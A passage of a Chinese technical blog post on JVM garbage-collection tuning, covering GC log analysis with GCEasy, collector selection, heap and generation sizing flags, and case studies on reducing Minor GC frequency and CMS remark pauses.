secs\\] \\[Times: user=0.06 sys=0.02, real=0.03 secs\\]   \n2022-01-12T15:02:45.800-0800: 9.595: \\[GC (Allocation Failure) \\[PSYoungGen: 539619K->32647K(733696K)\\] 600024K->99769K(865792K), 0.0280332 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:47.765-0800: 11.560: \\[GC (Allocation Failure) \\[PSYoungGen: 729479K->41445K(738304K)\\] 796601K->124936K(870400K), 0.0370655 secs\\] \\[Times: user=0.04 sys=0.02, real=0.04 secs\\]   \n2022-01-12T15:02:49.620-0800: 13.415: \\[GC (Allocation Failure) \\[PSYoungGen: 738277K->26677K(974848K)\\] 821768K->114930K(1106944K), 0.0270382 secs\\] \\[Times: user=0.05 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:52.146-0800: 15.942: \\[GC (Allocation Failure) \\[PSYoungGen: 959541K->17569K(985600K)\\] 1047794K->110447K(1117696K), 0.0274985 secs\\] \\[Times: user=0.05 sys=0.01, real=0.03 secs\\]   \n2022-01-12T15:02:54.110-0800: 17.905: \\[GC (Allocation Failure) \\[PSYoungGen: 950433K->10240K(1236480K)\\] 1043311K->109662K(1368576K), 0.0146713 secs\\] \\[Times: user=0.05 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:54.692-0800: 18.487: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 264005K->3360K(1259520K)\\] 363427K->109573K(1391616K), 0.0086901 secs\\] \\[Times: user=0.03 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:54.701-0800: 18.496: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 3360K->0K(1259520K)\\] \\[ParOldGen: 106213K->54092K(208384K)\\] 109573K->54092K(1467904K), \\[Metaspace: 56204K->56204K(1101824K)\\], 0.1487173 secs\\] \\[Times: user=0.69 sys=0.01, real=0.14 secs\\]   \n2022-01-12T15:02:57.787-0800: 21.583: \\[GC (Allocation Failure) \\[PSYoungGen: 1209856K->49146K(1321984K)\\] 1263948K->116260K(1530368K), 0.0339265 secs\\] \\[Times: user=0.05 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:03:16.198-0800: 39.994: \\[GC (Allocation Failure) \\[PSYoungGen: 1321978K->29589K(1335296K)\\] 1389092K->101049K(1543680K), 0.0214759 secs\\] \\[Times: user=0.06 sys=0.01, real=0.03 secs\\]   \n2022-01-12T15:03:19.021-0800: 42.816: \\[GC (GCLocker Initiated GC) \\[PSYoungGen: 1302421K->60915K(1280512K)\\] 1373881K->180735K(1488896K), 0.0482886 secs\\] \\[Times: user=0.08 sys=0.01, real=0.05 secs\\]   \n2022-01-12T15:03:21.847-0800: 45.642: \\[GC (Allocation Failure) \\[PSYoungGen: 1280499K->89087K(1308672K)\\] 1400321K->228379K(1517056K), 0.0336500 secs\\] \\[Times: user=0.10 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:03:24.516-0800: 48.311: \\[GC (Allocation Failure) \\[PSYoungGen: 1308671K->67295K(1257472K)\\] 1447963K->225652K(1465856K), 0.0381420 secs\\] \\[Times: user=0.07 sys=0.02, real=0.04 secs\\]  \n\n\n\n```\n\n### 指标分析第二步：导入分析工具，尽心分析\n\n打开gceasy.io网站，并选择本地的gc文件，然后点击分析。\n\n（分析的速度根据日志的多少而定，可能会比较慢）\n\n![](./2024/06/16/JVM如何调优/1.png)\n接下来看看分析结果：\n\n### JVM memory size (JVM内存大小)\n\nGCEasy是一款非常好用的在线分析GC日志的工具，打开官网，直接上传gc日志，也可以更加上门的要求进行压缩上传。\n![](./2024/06/16/JVM如何调优/2.png)\n这里的Allocated和Peak分别表示可分配空间和峰值\n\n*   **Allocated**：可分配空间大小。\n\n    **具体含义如下**：指示为每一代分配的大小。此数据点是从GC日志收集的，因此它可能与JVM系统属性指定的大小相匹配，也可能不匹配。假设您已将总堆大小配置为2gb，而在运行时，如果JVM只分配了1gb，那么在本报告中，您将看到分配的大小仅为1gb\n\n*   **Peak：** 分配的峰值。\n\n    **具体含义如下**：每一代的峰值内存利用率。通常它不会超过分配的大小。然而，在少数情况下，我们也看到峰值利用率超出了分配的大小，特别是在G1 GC中\n\n\nJVM memory size ，GCEasy展示了年轻代、老年代、元空间。JVM给分配的大小和程序运行过程中使用的峰值大小。\n\n从JVM memory size展示的信息，我们可以判断是否需要做下面的几件事情。\n\n*   是否需要修改JVM内存（-Xms、-Xmx、-Xmn…）相关配置，比如年轻代和老年代峰值远远小于分配的大小，这个时候我们可以适当的减小内存设置。\n\n*   是否需要调整年轻代和老年代的比例(-XX:NewSize(-Xns)、-XX:MaxNewSize(-Xmn)、-XX:SurvivorRatio=8)。比如老年大的峰值一直小于老年代申请的内存，这个时候我们可以稍微多分点空间给年轻代。\n\n*   是否需要修改元空间(XX:MetaspaceSize，-XX:MaxMetaspaceSize)相关设置。 **年轻代，老年代属于堆区，元空间属于非堆区（直接对接的是机器的内存）**\n\n\n### Key Performance Indicatiors（关键指标）\n\n![](./2024/06/16/JVM如何调优/3.png)\n*   Throughput：吞吐量。\n\n    指的是处理实际事务花费的时间与GC花费的时间的百分比。这个值越高越好\n\n*   Latency：\n\n    延迟情况。这里的延迟情况是指的GC过程花费的时间。具体含义如上图\n\n\nThroughput表示的是吞吐量 Latency表示响应时间 Avg Pause GC Time 平均GC时间 Max Pause GC TIme 最大GC时间\n\nKey Performance Indicators 给我们展示了GC吞吐量（应用程序线程用时占程序总用时的比例，越高越好），每次GC的平均耗时（建议控制在50ms以下），GC最长耗时，每个时间段的GC次数及占比信息。\n\n通过Key Performance Indicators显示的信息里面，我们需要关注下面几个问题：\n\n*   吞吐量，应用花在非GC上的时间百分比（引用花在生产任务上的百分比）。所以吞吐量越高越好。\n\n*   每次GC的平均耗时。越小越好，建议50ms以下。\n\n*   GC最长耗时。越小越好。如果你的应用是一个后台程序，并且任何请求不超过10秒，那么GC最长耗时就不能超过10秒。\n\n\n### Interactive Graphs(交互图)\n\nInteractive Graphs 展示了\n\n**Heap after GC**：GC之后堆的使用情况 **Heap before GC**：GC之前堆的使用情况 **GC Duration**：GC持续时间 **Reclaimed Bytes**：GC回收掉的垃圾对象的内存大小 **Young Gen**：年轻代堆的使用情况 **Old Gen**：老年代堆的使用情况 **Meta Space**：元空间的使用情况 **A & P**：每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。\n\n第一部分是Heap after GC，GC后堆的内存图，堆是用来存储对象的，从图中可以看出，随着GC的进行，垃圾回收器把对象都回收掉了，因此堆的大小逐渐增大。\n![](./2024/06/16/JVM如何调优/4.png)\n第二部分是Heap before GC，这是GC前堆的使用率，可以看出随着程序的运行，堆使用率越来越高，堆被对象占用的内存越来越大。\n![](./2024/06/16/JVM如何调优/5.png)\n第三部分是GC Duration Time，就是GC持续时间。一个GC事件的发生具有多个阶段，而不同的垃圾回收器又有不同的阶段，这里展示不作细分。这些阶段（例如并发标记，并发清除等）与程序线程一起并发运行，此时不会暂停程序线程。但是某些阶段（例如初始标记，清除等）会暂停整个应用程序，所以此图标描述的仅暂停阶段所花费的时间。\n![](./2024/06/16/JVM如何调优/6.png)\n第四部分表示的是GC回收掉的垃圾对象的内存大小。\n![](./2024/06/16/JVM如何调优/7.png)\n第五部分表示的是Young Gen，年轻代的内存分配情况。对象都是朝生夕死，年轻代存放的就是刚刚产生的对象，每进行一次GC，都会GC掉很多垃圾对象，剩下的就是右GC Root关联的对象，这些对象会年龄会逐渐增加，达到了一定阈值就会晋升为老年代的对象。可以看到before GC表示的图线随着时间的进行逐渐增大，也就是年轻代中对象越来越多，而GC事件发生后，年轻代中对象就会减少，也就是after GC图线表示的内存变化趋势。\n![](./2024/06/16/JVM如何调优/8.png)\n第六部分是Old Gen，表示的是老年代的内存分配情况。细心的读者会发现，为啥一开始before GC的内存大小比after GC的内存分配要少呢？这里得先知道老年代存放的都是年龄大的对象，意思就是经过了多次GC都没有被GC掉的对象，就会晋升为老年代的对象。所以这就解释了为啥after GC内存要比before GC内存要大，因为每次GC过后，都会有年轻代的对象晋升为老年代对象。\n![](./2024/06/16/JVM如何调优/9.png)\n第七部分是每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。\n![](./2024/06/16/JVM如何调优/10.png)\n### GC Statistics(GC统计信息)\n\n![](./2024/06/16/JVM如何调优/11.png)\n每种GC总共回收了多少内存、总共用了多长时间、平均时间、以及每种GC的单独统计信息啥的。\n\n### Object Stats(对象的一些统计信息)\n\n![](./2024/06/16/JVM如何调优/12.png)\n### GC Causes(GC的原因信息)\n\n![](./2024/06/16/JVM如何调优/13.png)\n### Memory Leak\n\n由于记录的程序没有内存泄漏，所以这里就没有内存泄漏的日志信息。\n\n此处可以诊断8种OOM中的5种（Java堆内存溢出，超出GC开销限制，请求数组大小超过JVM限制，Permgen空间，元空间）。\n\n四：JVM 常用配置策略\n------------\n\n### 垃圾回收器的选择\n\n选择垃圾回收器时，应根据CPU核心数、关注点（吞吐量或用户停顿时间）以及JDK版本等因素做出合适的选择，以提高应用程序的性能和稳定性。\n\n*   **CPU单核：**\n\n    当系统仅有单核CPU时，Serial垃圾收集器是最佳选择。\n\n    由于单核系统的性能瓶颈主要集中在单一处理器上，使用Serial垃圾收集器能够简化垃圾回收的过程，提高系统的整体性能。\n\n*   **CPU多核：关注吞吐量**\n\n    对于多核CPU且关注系统吞吐量的情况，推荐选择Parallel Scavenge（PS）加 Parallel Old（PO）的组合。\n\n    这种组合利用了多核CPU的并行处理能力，通过并行处理新生代和老年代的垃圾收集，以提高系统的吞吐量和整体性能。\n\n*   **CPU多核，关注用户停顿时间，JDK版本1.6或1.7：**\n\n    如果系统是多核CPU，并且更关注用户停顿时间，特别是在JDK版本为1.6或1.7的情况下，推荐选择Concurrent Mark-Sweep（CMS）垃圾收集器。\n\n    CMS垃圾收集器以减少应用程序停顿时间为目标，通过与应用程序线程并发执行部分垃圾回收操作，从而降低了GC造成的停顿时间，提高了系统的响应速度和用户体验。\n\n*   **CPU多核，关注用户停顿时间，JDK1.8及以上，JVM可用内存6G以上：**\n\n    对于JDK版本为1.8及以上，并且系统具备充足的内存资源（6G及以上），且依然关注用户停顿时间的情况，推荐选择Garbage-First（G1）垃圾收集器。\n\n    G1垃圾收集器是一种面向服务端应用的垃圾收集器，具有高效的垃圾回收、可预测的停顿时间和良好的内存整理能力，适用于对用户停顿时间有较高要求的应用场景。\n\n\n**垃圾回收器的选择 的切换配置：**\n\n```\n\n\n//设置Serial垃圾收集器（新生代）  \n 开启：-XX:+UseSerialGC  \n   \n //设置PS+PO,新生代使用功能Parallel Scavenge 老年代将会使用Parallel Old收集器  \n 开启 -XX:+UseParallelOldGC  \n   \n //CMS垃圾收集器（老年代）  \n 开启 -XX:+UseConcMarkSweepGC  \n   \n //设置G1垃圾收集器  \n 开启 -XX:+UseG1GC  \n\n\n\n```\n\n### JVM参数常用原则\n\n*   对于JVM堆的设置\n\n    通常我们会使用 **\\-Xms** 和 **\\-Xmx** 来设定最小和最大堆大小，将它们设置为相同的值可以防止垃圾收集器在堆大小之间进行收缩，从而减少额外的时间消耗。\n\n*   年轻代和年老代的大小将根据默认比例（通常为1：2）分配堆内存。\n\n    我们可以通过调整 **\\-XX:NewRatio** 参数来调整它们之间的比例，\n\n    也可以通过 **\\-XX:NewSize** 和 **\\-XX:MaxNewSize** 来设置年轻代的绝对大小。\n\n    为了防止年轻代堆大小的调整，通常将 **\\-XX:NewSize** 和 **\\-XX:MaxNewSize** 设置为相同大小。\n\n*   年轻代和年老代大小的合理设置没有标准答案，因此调优时需要观察它们大小变化对系统的影响。\n\n    更大的年轻代会延长普通GC周期但增加每次GC的时间，而更小的年老代会导致更频繁的Full GC。\n\n    选择应根据应用程序对象生命周期的分布情况，例如，如果应用存在大量的临时对象，则应选择更大的年轻代；如果存在大量的持久对象，则应适当增大年老代。\n\n    观察应用一段时间后，根据峰值时年老代所占内存来调整年轻代的大小，但应保留年老代至少1/3的增长空间。\n\n*   在配置较好的机器上（如多核、大内存），可以为年老代选择并行收集算法，使用**XX:+UseParallelOldGC**，默认为串行收集。\n\n*   线程堆栈的设置：每个线程默认会分配1M的堆栈空间，用于存放栈帧、调用参数、局部变量等。\n\n    对于大多数应用来说，这个默认值过大，一般可以将其减小至256K。\n\n    减小线程堆栈大小可以在内存不变的情况下创建更多线程，但这也受限于操作系统的支持。\n\n\n五：常见调优策略\n--------\n\n### 5.1 调整内存大小\n\n*   现象：垃圾收集频率非常频繁\n\n*   措施：考虑增加堆内存大小。\n\n*   说明：\n\n\n频繁的垃圾收集通常是由于内存过小，导致需要不断进行垃圾收集以释放空间来容纳新对象。\n\n因此，增加堆内存大小可以显著降低垃圾收集的频率。\n\n需要注意的是，如果垃圾收集次数虽然频繁但每次回收的对象却很少，那么问题可能不在于内存过小，而是由于内存泄漏导致的对象无法被正确回收，从而引发了频繁的垃圾收集。\n\n在这种情况下，调整内存大小可能无法解决问题，而需要对代码进行进一步的分析和调试。\n\n```\n\n\n //设置堆初始值  \n 指令1：-Xms2g  \n 指令2：-XX:InitialHeapSize=2048m  \n   \n //设置堆区最大值  \n 指令1：\\`-Xmx2g\\`   \n 指令2： -XX:MaxHeapSize=2048m  \n   \n //新生代内存配置  \n 指令1：-Xmn512m  \n 指令2：-XX:MaxNewSize=512m\n\n\n```\n\n### 5.2 调整GC触发时机\n\n*   现象：\n\n    在CMS和G1垃圾回收器下，频繁发生Full GC，导致程序严重卡顿。\n\n*   说明：\n\n\n在G1和CMS的部分GC阶段是并发进行的，即业务线程和垃圾收集线程同时运行。\n\n这意味着在垃圾收集过程中，业务线程可能会生成新的对象。\n\n因此，在进行垃圾收集时，需要预留一部分内存空间来容纳新产生的对象。\n\n如果此时内存空间不足以容纳新对象，JVM会停止并发收集，暂停所有业务线程（STW），以确保垃圾收集正常进行。\n\n可以通过调整GC的触发时机（例如在老年代占用60%时触发GC）来预留足够的空间给业务线程创建的对象。\n\n```\n\n\n //使用多少比例的老年代后开始CMS收集，默认是68%，如果频繁发生SerialOld卡顿，应该调小  \n -XX:CMSInitiatingOccupancyFraction  \n   \n //G1混合垃圾回收周期中要包括的旧区域设置占用率阈值。默认占用率为 65%  \n -XX:G1MixedGCLiveThresholdPercent=65 \n\n\n```\n\n### 5.3 调整对象晋升到老年代年龄阈值\n\n*   现象：\n\n    老年代发生频繁的GC，每次清理回收大量对象。\n\n*   说明：\n\n\n当对象的晋升年龄设定较低时，新生代中的对象很快就会被晋升到老年代。\n\n这导致老年代中对象数量增多，其中很多对象实际上在短时间内就可能被回收。\n\n通过调整对象的晋升年龄，可以减少过早进入老年代的对象数量，从而减少老年代的空间压力和频繁的GC。\n\n注意：提高晋升年龄虽然可以减缓老年代的压力，但同时可能会增加新生代的GC频率，因为对象在新生代的停留时间变长。\n\n此外，新生代中频繁复制这些对象可能会导致新生代的GC时间也相应增长。\n\n在调整晋升年龄时，应综合考虑新生代和老年代的GC性能，以达到最优的系统性能平衡。\n\n```\n\n\n // 进入老年代最小的GC年龄,年轻代对象转换为老年代对象最小年龄值，默认值7  \n -XX:InitialTenuringThreshol=7 \n\n\n```\n\n### 5.4 调整大对象进入老年代的标准\n\n*   现象：\n\n    老年代经常发生频繁的GC，每次回收大量对象，而这些对象的体积都相对较大。\n\n*   说明：\n\n\n大量大对象直接分配到老年代会快速填满老年代空间，导致老年代频繁GC。\n\n为解决此问题，可调整大对象直接进入老年代的标准。\n\n需要注意：将大对象调整为直接进入老年代后，可能会增加新生代的GC频率和时间。\n\n```\n\n\n //新生代可容纳的最大对象,大于则直接会分配到老年代，0代表没有限制。  \n  -XX:PretenureSizeThreshold=1000000 \n\n\n```\n\n### 5.5 调整内存区域大小比率\n\n*   现象：\n\n    某一内存区域频繁发生GC，而其他区域的GC表现正常。\n\n*   说明：\n\n\n频繁的GC可能是由于对应区域的空间不足所致，需要不断进行GC以释放空间。\n\n在JVM堆内存无法增加的情况下，可以考虑调整对应区域的大小比率。\n\n注意：尽管频繁的GC可能是由于空间不足造成的，但也有可能是因为内存泄漏导致内存无法回收，进而引发GC频繁。\n\n因此，在调整内存区域大小比率之前，需要仔细分析是否存在内存泄漏问题。\n\n```\n\n\n // survivor区和Eden区大小比率  \n 指令：-XX:SurvivorRatio=6  //S区和Eden区占新生代比率为1:6,两个S区2:6  \n   \n // 新生代和老年代的占比  \n -XX:NewRatio=4  //表示新生代:老年代 = 1:4 即老年代占整个堆的4/5；默认值=2\n\n\n```\n\n### 5.6 调整对象晋升至老年代的年龄阈值\n\n*   现象：\n\n    老年代频繁进行GC，每次回收大量对象。\n\n*   说明：\n\n\n如果对象的晋升年龄较小，新生代中的对象很快就会晋升至老年代，导致老年代中对象数量增多。\n\n然而，这些对象在接下来的短时间内可能会被回收。为解决老年代空间不足导致的频繁GC问题，可调整对象晋升至老年代的年龄阈值，使对象不那么容易晋升至老年代。\n\n注意：增加对象晋升年龄可能会导致新生代中对象的停留时间增加，从而增加新生代的GC频率，并且复制大对象可能导致新生代GC的时间延长。\n\n在调整晋升年龄时，需综合考虑新生代和老年代的GC性能，以获得最优的系统性能平衡。\n\n### 5.7 调整垃圾回收的触发时机\n\n*   现象：\n\n    G1和CMS垃圾收集器在执行垃圾回收时与应用程序的业务线程并发工作。\n\n    在垃圾回收过程中，业务线程可能生成新对象，需预留内存空间以容纳这些新产生的对象。\n\n    若内存空间不足，JVM会暂停所有业务线程（STW）以确保垃圾回收正常进行。\n\n*   说明：\n\n\n在进行垃圾回收时，若未预留足够的内存空间供新对象使用，可能导致内存压力过大，从而触发STW。\n\n通过调整垃圾回收的触发时机来预留足够的内存空间，如可设定在老年代占用达到一定比例时触发垃圾回收。\n\n这有助于提前释放内存空间，为新对象分配留出足够的空间，从而减少因内存不足而导致的STW情况。\n\n注意：\n\n提早触发垃圾回收会增加老年代垃圾回收的频率，这可能导致一些性能开销，如额外的CPU使用和系统停顿时间。\n\n因此，在调整垃圾回收的触发时机时，需要在性能与内存利用率之间找到恰当的平衡。\n\n### 5.8 设置符合预期的停顿时间\n\n> **现象**： 程序间接性的卡顿 **原因**：如果没有确切的停顿时间设定，垃圾收集器以吞吐量为主，那么垃圾收集时间就会不稳定。 **注意**：不要设置不切实际的停顿时间，单次时间越短也意味着需要更多的GC次数才能回收完原有数量的垃圾.\n\n参数配置：l\n\n```\n\n\n //GC停顿时间，垃圾收集器会尝试用各种手段达到这个时间  \n      -XX:MaxGCPauseMillis \n\n\n```\n\n六： JVM调优案例和实践\n-------------\n\n### 案例1：网站流量增加后，网页响应速度变慢\n\n**问题描述** 在测试环境中，网站速度较快，但一到生产环境就显著变慢。 **问题分析**\n\n1.  **初步诊断**： 通过使用 **jstat -gc** 指令监控线上JVM的GC活动，发现GC频率和所占时间异常高。这表明频繁的GC正影响业务线程的执行，从而导致页面响应缓慢。\n\n2.  **内存调整后的问题**： 增加JVM的堆内存从2GB到16GB后，虽然常规请求的处理速度提高，但出现了间歇性的更长时间卡顿。进一步监控发现，虽然Full GC（FGC）的次数不多，但每次的持续时间过长，有时达到几十秒。\n\n3.  **原因推断**： 增加堆内存后，虽然减少了频繁的垃圾回收，但因为PS+PO垃圾收集器（Parallel Scavenge + Parallel Old）在垃圾标记和收集阶段都需要停止所有工作线程（STW），所以每次GC时业务线程的停顿时间显著增长。\n\n\n**解决方案**\n\n1.  **调整垃圾收集器**： 服务不稳定的根本问题是垃圾回收过程中的停顿时间过长，由于默认的PS+PO组合垃圾收集器导致。为了解决这一问题，可更换为并发类的收集器，如CMS垃圾收集器。\n\n2.  **CMS配置优化**： 根据系统运行的实际情况，调整CMS的启动阈值，预设了合理的停顿时间，以确保不会因为内存回收而影响用户的使用体验。\n\n\n### 案例2：CPU飙升和GC频繁的调优实践\n\n**问题描述：** 随着在线游戏玩家数量的增加，系统出现CPU飙升和GC频繁的情况，导致游戏体验下降。 **问题分析：** 使用监控工具检查系统的CPU使用情况和GC情况，发现系统在高负载情况下CPU占用过高，且GC频率过于频繁。 **解决方案：**\n\n1.  **代码优化**：进行代码审查和性能分析，发现并优化存在不必要的循环操作和资源竞争问题，以减少CPU占用。\n\n2.  **堆内存调整**：增加堆内存大小，减少GC的频率，提高系统的吞吐量和稳定性，确保系统能够应对增加的玩家数量。\n\n3.  **GC算法调优**：根据系统负载情况和硬件环境，选择合适的GC算法，并调整相应的参数，以减少GC造成的性能损耗。例如，针对大堆内存和高并发情况，可以考虑使用并行GC或G1收集器，并根据具体情况调整相关参数以提升性能。\n\n\n### 案例3：数据分析平台系统频繁 Full GC\n\n**问题描述：** 数据分析平台对用户在App中的行为进行定时分析统计，但系统频繁发生Full GC，导致页面打开卡顿，影响用户体验。 **问题分析：**\n\n1.  **CMS GC算法使用**：系统使用CMS（Concurrent Mark-Sweep）GC算法，但频繁的Full GC表明GC调优方面存在问题。\n\n2.  **Young GC后存活对象进入老年代**：使用jstat命令监控发现，每次Young GC后大约有10%的存活对象进入老年代，这意味着Survivor区空间可能设置过小，导致存活对象在Survivor区放不下而提前进入老年代。\n\n\n**解决方案：**\n\n1.  **调整Survivor区大小**：增大Survivor区大小，确保其能容纳Young GC后的存活对象，使存活对象能在Survivor区经历多次Young GC达到年龄阈值后才进入老年代。\n\n2.  **优化存活对象进入老年代的大小**：调整Survivor区大小后，每次Young GC后进入老年代的存活对象稳定在几百KB左右，大大降低了Full GC的频率，提升了系统的稳定性和性能。\n\n\n### 案例4：内存飙高问题定位\n\n**问题描述**：在Java进程中，内存飙高，可能是由于大量对象创建或内存泄漏导致的。\n\n持续的内存飙高可能表明垃圾回收跟不上对象创建速度，或存在内存泄漏导致对象无法回收。 **问题分析：**\n\n1.  **观察垃圾回收情况：**\n\n\n*   使用 **jstat -gc PID 1000** 命令观察GC次数、时间等信息，每隔一秒打印一次。\n\n*   使用 **jmap -histo PID | head -20** 命令查看堆内存占用空间最大的前20个对象类型。\n\n*   如果GC频率高且每次回收的内存空间正常，可能是对象创建速度过快导致内存占用高；如果每次回收的内存很少，可能是内存泄漏。\n\n\n3.  **导出堆内存文件快照：**\n\n\n*   使用 **jmap -dump:live,format=b,file=/home/myheapdump.hprof PID** 命令将堆内存信息导出到文件，以进一步分析内存占用情况。\n\n\n**解决方案：** 通过使用VisualVM对dump文件进行离线分析，识别内存占用较高的对象，并进一步定位到创建这些对象的业务代码位置，以便从代码和业务场景中精确定位具体问题。\n\n### 案例5：Major GC和Minor GC频繁\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\n服务情况：Minor GC每分钟100次 ，Major GC每4分钟一次，单次Minor GC耗时25ms，单次Major GC耗时200ms，接口响应时间50ms。\n\n由于这个服务要求低延时高可用，结合上文中提到的GC对服务响应时间的影响，计算可知由于Minor GC的发生，12.5%的请求响应时间会增加，其中8.3%的请求响应时间会增加25ms，可见当前GC情况对响应时间影响较大。\n\n_（50ms+25ms）× 100次/60000ms = 12.5%，50ms × 100次/60000ms = 8.3%_ 。\n\n优化目标：降低TP99、TP90时间。\n\n#### 优化\n\n首先优化Minor GC频繁问题。通常情况下，由于新生代空间较小，Eden区很快被填满，就会导致频繁Minor GC，因此可以通过增大新生代空间来降低Minor GC的频率。例如在相同的内存分配率的前提下，新生代中的Eden区增加一倍，Minor GC的次数就会减少一半。\n\n这时很多人有这样的疑问，扩容Eden区虽然可以减少Minor GC的次数，但会增加单次Minor GC时间么？根据上面公式，如果单次Minor GC时间也增加，很难保证最后的优化效果。\n\n结合下面情况来分析，单次Minor GC时间主要受哪些因素影响？是否和新生代大小存在线性关系？\n\n首先，单次Minor GC时间由以下两部分组成：T1（扫描新生代）和 T2（复制存活对象到Survivor区）如下图。（注：这里为了简化问题，我们认为T1只扫描新生代判断对象是否存活的时间，其实该阶段还需要扫描部分老年代，后面案例中有详细描述。）\n\n![](./2024/06/16/JVM如何调优/14.png)\n*   扩容前：新生代容量为R ，假设对象A的存活时间为750ms，Minor GC间隔500ms，那么本次Minor GC时间= T1（扫描新生代R）+T2（复制对象A到S）。\n\n*   扩容后：新生代容量为2R ，对象A的生命周期为750ms，那么Minor GC间隔增加为1000ms，此时Minor GC对象A已不再存活，不需要把它复制到Survivor区，那么本次GC时间 = 2 × T1（扫描新生代R），没有T2复制时间。\n\n\n可见，扩容后，Minor GC时增加了T1（扫描时间），但省去T2（复制对象）的时间，更重要的是对于虚拟机来说，复制对象的成本要远高于扫描成本，所以，单次**Minor GC时间更多取决于GC后存活对象的数量，而非Eden区的大小**。因此如果堆中短期对象很多，那么扩容新生代，单次Minor GC时间不会显著增加。下面需要确认下服务中对象的生命周期分布情况：\n\n![](./2024/06/16/JVM如何调优/15.png)\n通过上图GC日志中两处红色框标记内容可知：\n\n1.  new threshold = 2（动态年龄判断，对象的晋升年龄阈值为2），对象仅经历2次Minor GC后就晋升到老年代，这样老年代会迅速被填满，直接导致了频繁的Major GC。\n\n2.  Major GC后老年代使用空间为300M+，意味着此时绝大多数(86% = 2G/2.3G)的对象已经不再存活，也就是说生命周期长的对象占比很小。\n\n\n由此可见，服务中存在大量短期临时对象，扩容新生代空间后，Minor GC频率降低，对象在新生代得到充分回收，只有生命周期长的对象才进入老年代。这样老年代增速变慢，Major GC频率自然也会降低。\n\n#### 优化结果\n\n通过扩容新生代为为原来的三倍，单次Minor GC时间增加小于5ms，频率下降了60%，服务响应时间TP90，TP99都下降了10ms+，服务可用性得到提升。\n\n调整前：\n![](./2024/06/16/JVM如何调优/16.png)\n调整后：\n![](./2024/06/16/JVM如何调优/17.png)\n#### 小结\n\n如何选择各分区大小应该依赖应用程序中**对象生命周期的分布情况：如果应用存在大量的短期对象，应该选择较大的年轻代；如果存在相对较多的持久对象，老年代应该适当增大。**\n\n#### 更多思考\n\n关于上文中提到晋升年龄阈值为2，很多同学有疑问，为什么设置了MaxTenuringThreshold=15，对象仍然仅经历2次Minor GC，就晋升到老年代？这里涉及到“动态年龄计算”的概念。\n\n**动态年龄计算**：\n\nHotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值。在本案例中，调优前：Survivor区 = 64M，desired survivor = 32M，此时Survivor区中age<=2的对象累计大小为41M，41M大于32M，所以晋升年龄阈值被设置为2，下次Minor GC时将年龄超过2的对象被晋升到老年代。\n\nJVM引入动态年龄计算，主要基于如下两点考虑：\n\n1.  如果固定按照MaxTenuringThreshold设定的阈值作为晋升条件：\n\n    a）MaxTenuringThreshold设置的过大，原本应该晋升的对象一直停留在Survivor区，直到Survivor区溢出，一旦溢出发生，Eden+Svuvivor中对象将不再依据年龄全部提升到老年代，这样对象老化的机制就失效了。\n\n    b）MaxTenuringThreshold设置的过小，“过早晋升”即对象不能在新生代充分被回收，大量短期对象被晋升到老年代，老年代空间迅速增长，引起频繁的Major GC。分代回收失去了意义，严重影响GC性能。\n\n2.  相同应用在不同时间的表现不同：特殊任务的执行或者流量成分的变化，都会导致对象的生命周期分布发生波动，那么固定的阈值设定，因为无法动态适应变化，会造成和上面相同的问题。\n\n\n总结来说，为了更好的适应不同程序的内存情况，虚拟机并不总是要求对象年龄必须达到Maxtenuringthreshhold再晋级老年代。\n\n### 美团案例6: 请求高峰期发生GC，导致服务可用性下降\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\nGC日志显示，高峰期CMS在重标记（Remark）阶段耗时1.39s。\n\nRemark阶段是Stop-The-World（以下简称为STW）的，即在执行垃圾回收时，Java应用程序中除了垃圾回收器线程之外其他所有线程都被挂起，意味着在此期间，用户正常工作的线程全部被暂停下来，这是低延时服务不能接受的。本次优化目标是降低Remark时间。\n\n![](./2024/06/16/JVM如何调优/18.png)\n#### 优化\n\n解决问题前，先回顾一下CMS的四个主要阶段，以及各个阶段的工作内容。下图展示了CMS各个阶段可以标记的对象，用不同颜色区分。\n\n1.  Init-mark初始标记(STW) ，该阶段进行可达性分析，标记GC ROOT能直接关联到的对象，所以很快。\n\n2.  Concurrent-mark并发标记，由前阶段标记过的绿色对象出发，所有可到达的对象都在本阶段中标记。\n\n3.  Remark重标记(STW) ，暂停所有用户线程，重新扫描堆中的对象，进行可达性分析，标记活着的对象。因为并发标记阶段是和用户线程并发执行的过程，所以该过程中可能有用户线程修改某些活跃对象的字段，指向了一个未标记过的对象，如下图中红色对象在并发标记开始时不可达，但是并行期间引用发生变化，变为对象可达，这个阶段需要重新标记出此类对象，防止在下一阶段被清理掉，这个过程也是需要STW的。特别需要注意一点，这个阶段是以新生代中对象为根来判断对象是否存活的。\n\n4.  并发清理，进行并发的垃圾清理。\n\n\n![](./2024/06/16/JVM如何调优/19.png)\n可见，Remark阶段主要是通过扫描堆来判断对象是否存活。那么准确判断对象是否存活，需要扫描哪些对象？CMS对老年代做回收，Remark阶段仅扫描老年代是否可行？结论是不可行，原因如下：\n![](./2024/06/16/JVM如何调优/20.png)\n如果仅扫描老年代中对象，即以老年代中对象为根，判断对象是否存在引用，上图中，对象A因为引用存在新生代中，它在Remark阶段就不会被修正标记为可达，GC时会被错误回收。\n\n新生代对象持有老年代中对象的引用，这种情况称为**“跨代引用”**。因它的存在，Remark阶段必须扫描整个堆来判断对象是否存活，包括图中灰色的不可达对象。\n\n灰色对象已经不可达，但仍然需要扫描的原因：**新生代GC和老年代的GC是各自分开独立进行的**，只有Minor GC时才会使用根搜索算法，标记新生代对象是否可达，也就是说虽然一些对象已经不可达，但在Minor GC发生前不会被标记为不可达，CMS也无法辨认哪些对象存活，只能全堆扫描（新生代+老年代）。\n\n由此可见堆中对象的数目影响了Remark阶段耗时。 